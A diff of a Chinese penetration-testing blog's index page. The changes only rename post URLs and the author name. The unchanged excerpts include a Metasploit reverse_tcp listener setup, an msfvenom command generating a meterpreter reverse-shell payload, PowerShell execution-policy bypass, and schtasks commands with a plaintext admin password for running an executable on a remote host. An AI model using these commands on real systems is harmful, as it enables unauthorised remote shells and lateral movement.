@@ -309,10 +309,10 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/2017-03-09-msfvenom-advanced.html">
+    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/msfvenom-advanced.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Evil-404">
+      <meta itemprop="name" content="VK">
       <meta itemprop="description" content="">
       <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
     </span>
@@ -328,7 +328,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017-03-09-msfvenom-advanced.html" itemprop="url">msfvenom 进阶 [暂未完...]</a></h1>
+                <a class="post-title-link" href="/msfvenom-advanced.html" itemprop="url">msfvenom 进阶 [暂未完...]</a></h1>
         
 
         <div class="post-meta">
@@ -451,7 +451,7 @@
 <p>0x02 首先,创建好监听器,等待shell回连,务必注意,创建什么类型的payload就要用什么类型的监听器来接收,必须一一对应,此处就以最普通的tcp监听器为例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf &gt; set lport 443</span><br><span class="line">msf &gt; set lhost 192.168.3.12</span><br><span class="line">msf &gt; exploit -j</span><br></pre></td></tr></table></figure></p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2017-03-09-msfvenom-advanced.html#more" rel="contents">
+            <a class="btn" href="/msfvenom-advanced.html#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -503,10 +503,10 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/2017-02-01-tcpdump-sniffer-pass.html">
+    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/tcpdump-sniffer-pass.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Evil-404">
+      <meta itemprop="name" content="VK">
       <meta itemprop="description" content="">
       <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
     </span>
@@ -522,7 +522,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017-02-01-tcpdump-sniffer-pass.html" itemprop="url">linux下的嗅探实践 [tcpdump篇]</a></h1>
+                <a class="post-title-link" href="/tcpdump-sniffer-pass.html" itemprop="url">linux下的嗅探实践 [tcpdump篇]</a></h1>
         
 
         <div class="post-meta">
@@ -644,7 +644,7 @@
           <p><br><br>单单对于渗透而言,我们可以拿 tcpdump 干些什么:<br>&nbsp;&nbsp;&nbsp;&nbsp;从工具命名不难看出,所谓 tcpdump 的意思,其实就是把 tcp 的数据[当然啦,它并非仅仅支持tcp/ip协议族] dump下来,我想作者应该也是这个意思,在常规生产环境中,运维或者协议分析师可能主要用它来捕捉一些敏感的流量行为(通过不同的数据特征来辨别出哪些流量可能带有入侵或者攻击行为),排查诊断各种网络故障,或者专门针对某个工具进行逆向(流量)分析等等……,就tcpdump本身来讲,它能做的事情非常多,真要仔细讲,可能会像wireshark那样,又得出本书,工具虽然小巧,但用途良多,下面就我们单单就实际渗透过程中的一些用法做些简单科普,主要还是用它来抓抓明文密码[当然,它本身的强大绝非仅限于此,个人能力有限,也没一下子涉及那么多,今天只单单说一个点(可能连个点都算不上吧,基本是没有任何技术含量的)]<br><br><br>以centos 6.x中的具体编译安装为例[在其它的发行版中安装方法基本类似],都非常简单,但考虑到文章的完整性想想还是一并说了算了(主要是想让大家能快速上手),工具是开源的(基于c,安装自然需要c编译器[gcc]),请自行到官方站点下载其源码包:<br><a href="http://www.tcpdump.org/" target="_blank" rel="noopener">http://www.tcpdump.org/</a><br>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2017-02-01-tcpdump-sniffer-pass.html#more" rel="contents">
+            <a class="btn" href="/tcpdump-sniffer-pass.html#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -696,10 +696,10 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/2016-10-07-empire-powershell.html">
+    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/empire-powershell.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Evil-404">
+      <meta itemprop="name" content="VK">
       <meta itemprop="description" content="">
       <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
     </span>
@@ -715,7 +715,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2016-10-07-empire-powershell.html" itemprop="url">powershell 渗透框架 [empire]</a></h1>
+                <a class="post-title-link" href="/empire-powershell.html" itemprop="url">powershell 渗透框架 [empire]</a></h1>
         
 
         <div class="post-meta">
@@ -837,7 +837,7 @@
           <p><br><br>0x01 前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;对于<code>empire</code>[说实话确实有些老了] 想必大家也都已经不再陌生,很多人说它是<code>神器</code>,嘿嘿……原谅我一直也没搞清楚<code>神器</code>的具体定义到底是什么[虽然,我知道这对于实际渗透并没任何卵用],也许在我有限的认知里,一直都以为只有能在千里之外轻松get到目标系统的system或者root权限的shell的<code>0day</code>才叫神器,如果动不动就把某个确实好用点儿的脚本或者工具就叫神器,未免有点儿草率,也显得不稳重,不是吗,自己有个比较野蛮的习惯,在用别人工具的时候,总是忍不住会观察,因为想尽可能理解它的内部实现[最好也是最直接的一手学习资料],<code>如果换成是我自己这代码会怎么写呢</code>,虽然是后知后觉,但拓展出来的思路足以让自己受益良多[站在别人的肩膀上可以走的更快,这是真的],虽然,自己并没有再把代码把它实现一遍,但对整个工具架构实现已经有了更清晰的理解和把握,到了实际用的时候自然就不一样了[更灵活点儿嘛],以后再看到类似的工具,可能一眼就能看透个百分之七八十,嘿嘿……纯粹是个人喜好哈,听过就好,废话过后,咱们说正题,今天主要是对empire中一些好用的powershell脚本做些简要的使用说明,当然啦,自己已经事先把empire中的powershell脚本选择性的提取了一下,因为我们的重点还是powershell,并非empire脚本本身,整个过程中也不会有任何涉及工具自身使用的东西,其实,empire使用真的非常简单,命令帮助已经写的非常详细了,看看帮助相信大家很快就能上手,不过整个工具最核心的东西还是这些ps脚本[对于一个职业渗透者来讲,您应该一开始就尽量朝着你所能理解的本质去,慢慢的,一旦养成这种习惯,同一个东西,你往往能看见别人看不见的一些小细节],因为这中间有很多脚本跟之前是重复的,所以就选择性的说一些,脚本使用都非常简单,就不再一一截图了,实在是好累啊,还是那句话,关键是大家能在实际渗透中用上,别的都是扯淡<br>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2016-10-07-empire-powershell.html#more" rel="contents">
+            <a class="btn" href="/empire-powershell.html#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -889,10 +889,10 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/2016-10-07-powersploit.html">
+    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/powersploit.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Evil-404">
+      <meta itemprop="name" content="VK">
       <meta itemprop="description" content="">
       <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
     </span>
@@ -908,7 +908,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2016-10-07-powersploit.html" itemprop="url">powershell 渗透框架 [PowerSploit]</a></h1>
+                <a class="post-title-link" href="/powersploit.html" itemprop="url">powershell 渗透框架 [PowerSploit]</a></h1>
         
 
         <div class="post-meta">
@@ -1031,7 +1031,7 @@
 <p>0x02 命令执行类模块 [CodeExecution]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Shellcode.ps1 向指定进程中注入我们的shellcode,我们可以通过这种方式弹回一个meterpreter,注意shellcode系统位数版本要跟目标的系统一致才行,另外,权限务够也是必须的</span><br><span class="line"><span class="comment"># msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.3.6 LPORT=1234 -f powershell -o /root/Desktop/shell.txt</span></span><br><span class="line"><span class="comment"># msfconsole 监听刚才的payload配置</span></span><br></pre></td></tr></table></figure></p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2016-10-07-powersploit.html#more" rel="contents">
+            <a class="btn" href="/powersploit.html#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1083,10 +1083,10 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/2016-10-06-nishang.html">
+    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/nishang.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Evil-404">
+      <meta itemprop="name" content="VK">
       <meta itemprop="description" content="">
       <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
     </span>
@@ -1102,7 +1102,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2016-10-06-nishang.html" itemprop="url">powershell 渗透框架[ nishang ]</a></h1>
+                <a class="post-title-link" href="/nishang.html" itemprop="url">powershell 渗透框架[ nishang ]</a></h1>
         
 
         <div class="post-meta">
@@ -1225,7 +1225,7 @@
 <p>0x02 关于nishang<br>&nbsp;&nbsp;&nbsp;&nbsp;今天我们就先来看看第一款powershell渗透框架<code>其实,个人觉得把它称为powershell渗透框架似乎更合适些</code>,<code>nishang</code> [想必现在早已家喻户晓],关于nishang中的各个ps脚本的选项用法,在其脚本代码的最前面都有详细说明,使用前请务必仔细阅读,因为系统默认是禁止执行ps脚本的,所以实际用的时候后面都会带上bypass选项<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy Unrestricted  如果你得到的是一个交互式的ps shell,也可以用该命令来放开脚本执行限制</span><br><span class="line"><span class="comment"># powershell –exec bypass –Command "Get-Host | Select-Object Version"  查看当前powershell版本,有些脚本只能在指定的powershell版本中执行</span></span><br></pre></td></tr></table></figure></p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2016-10-06-nishang.html#more" rel="contents">
+            <a class="btn" href="/nishang.html#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1277,10 +1277,10 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/2016-10-05-hidden-webshell.html">
+    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/hidden-webshell.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Evil-404">
+      <meta itemprop="name" content="VK">
       <meta itemprop="description" content="">
       <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
     </span>
@@ -1296,7 +1296,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2016-10-05-hidden-webshell.html" itemprop="url">放心地种下你的webshell 之 webshell隐藏小记</a></h1>
+                <a class="post-title-link" href="/hidden-webshell.html" itemprop="url">放心地种下你的webshell 之 webshell隐藏小记</a></h1>
         
 
         <div class="post-meta">
@@ -1467,10 +1467,10 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/2016-09-28-revese-shell.html">
+    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/revese-shell.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Evil-404">
+      <meta itemprop="name" content="VK">
       <meta itemprop="description" content="">
       <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
     </span>
@@ -1486,7 +1486,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2016-09-28-revese-shell.html" itemprop="url">你和目标只差一个shell的距离</a></h1>
+                <a class="post-title-link" href="/revese-shell.html" itemprop="url">你和目标只差一个shell的距离</a></h1>
         
 
         <div class="post-meta">
@@ -1612,7 +1612,7 @@
 <p><img src="/img/linux_perl.png" alt="&#39;&#39;"><br><br>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2016-09-28-revese-shell.html#more" rel="contents">
+            <a class="btn" href="/revese-shell.html#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1664,10 +1664,10 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/2016-09-27-install-py27-on-centos.html">
+    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/install-py27-on-centos.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Evil-404">
+      <meta itemprop="name" content="VK">
       <meta itemprop="description" content="">
       <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
     </span>
@@ -1683,7 +1683,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2016-09-27-install-py27-on-centos.html" itemprop="url">快速编译安装配置 py2.7 & jdk 1.7</a></h1>
+                <a class="post-title-link" href="/install-py27-on-centos.html" itemprop="url">快速编译安装配置 py2.7 & jdk 1.7</a></h1>
         
 
         <div class="post-meta">
@@ -1806,7 +1806,7 @@
 <p>0x02 编译安装python2.7:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># yum groupinstall "Development tools" -y</span></span><br><span class="line"><span class="comment"># yum install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel -y</span></span><br><span class="line"><span class="comment"># wget https://www.python.org/ftp/python/2.7.11/Python-2.7.11.tgz</span></span><br><span class="line"><span class="comment"># tar xf Python-2.7.11.tgz</span></span><br><span class="line"><span class="comment"># cd Python-2.7.11</span></span><br><span class="line"><span class="comment"># ./configure --prefix=/usr/local</span></span><br><span class="line"><span class="comment"># make &amp;&amp; make install</span></span><br><span class="line"><span class="comment"># echo $?</span></span><br><span class="line"><span class="comment"># python2.7</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; import sys</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; sys.version</span><br></pre></td></tr></table></figure></p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2016-09-27-install-py27-on-centos.html#more" rel="contents">
+            <a class="btn" href="/install-py27-on-centos.html#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1858,10 +1858,10 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/2016-09-26-msf-socks4a.html">
+    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/msf-socks4a.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Evil-404">
+      <meta itemprop="name" content="VK">
       <meta itemprop="description" content="">
       <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
     </span>
@@ -1877,7 +1877,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2016-09-26-msf-socks4a.html" itemprop="url">通向彼岸 之内网代理转发 [msf中的socs4a模块使用及meterpreter多级内网穿透]</a></h1>
+                <a class="post-title-link" href="/msf-socks4a.html" itemprop="url">通向彼岸 之内网代理转发 [msf中的socs4a模块使用及meterpreter多级内网穿透]</a></h1>
         
 
         <div class="post-meta">
@@ -2000,7 +2000,7 @@
 <p>0x02 首先,假设我们已经获取了目标系统的一个meterpreter会话,然后,我们发现在该目标机器上存在内网段,此时,我们想继续对目标该内网进行渗透,然后就有了下面的一些内容<br><img src="/img/ipconfig meter.jpg" alt=""><br>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2016-09-26-msf-socks4a.html#more" rel="contents">
+            <a class="btn" href="/msf-socks4a.html#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -2052,10 +2052,10 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/2016-09-25-ipc-reverse-shell.html">
+    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/ipc-reverse-shell.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Evil-404">
+      <meta itemprop="name" content="VK">
       <meta itemprop="description" content="">
       <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
     </span>
@@ -2071,7 +2071,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2016-09-25-ipc-reverse-shell.html" itemprop="url">win内网中利用ipc弹shell 小记</a></h1>
+                <a class="post-title-link" href="/ipc-reverse-shell.html" itemprop="url">win内网中利用ipc弹shell 小记</a></h1>
         
 
         <div class="post-meta">
@@ -2194,7 +2194,7 @@
 <p>0x02 利用最常规的copy[xcopy] &amp; schtasks(按说ipc建立以后,schtasks就不用带账号密码了,尤其我这里还是以system权限运行[本身就不需要账号密码],但实际测试中不带就拒绝访问,至于具体原因,暂未知,保险起见还是带上):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># schtasks /create /tn &quot;plugin_update&quot; /tr c:\windows\temp\plugin_update.exe /sc once /st 10:29 /S 192.168.3.168 /RU System  /u administrator /p &quot;admin!@#45&quot; </span><br><span class="line"># schtasks /run /tn &quot;plugin_update&quot; /S 192.168.3.168  /u administrator /p &quot;admin!@#45&quot;  你也可以不用等,让目标立即运行任务</span><br><span class="line"># schtasks /F /delete /tn &quot;plugin_update&quot; /S 192.168.3.168 /u administrator /p &quot;admin!@#45&quot;</span><br></pre></td></tr></table></figure></p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2016-09-25-ipc-reverse-shell.html#more" rel="contents">
+            <a class="btn" href="/ipc-reverse-shell.html#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -2274,9 +2274,9 @@
             
               <img class="site-author-image" itemprop="image"
                 src="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg"
-                alt="Evil-404" />
+                alt="VK" />
             
-              <p class="site-author-name" itemprop="name">Evil-404</p>
+              <p class="site-author-name" itemprop="name">VK</p>
               <p class="site-description motion-element" itemprop="description">别惹我,我疯起来连自己都黑！</p>
           </div>
 
@@ -2441,11 +2441,11 @@ show_date_time();
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">Evil-404</span>
+  <span class="author" itemprop="copyrightHolder">VK</span>
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共293.4k字</span>
+  <span class="post-count">博客全站共293.5k字</span>
 </div>
 
   
@@ -2460,15 +2460,12 @@ show_date_time();
 
 
 
-  <div class="theme-info">BY &mdash; <a class="theme-link" target="_blank" href="https://evil-404.github.io/">修改版.Mist</a> v</div>
-
 
 
 
 <span id="busuanzi_container_site_pv">
     本站总访问量<span id="busuanzi_value_site_pv"></span>次
 </span>
-
         
 
 
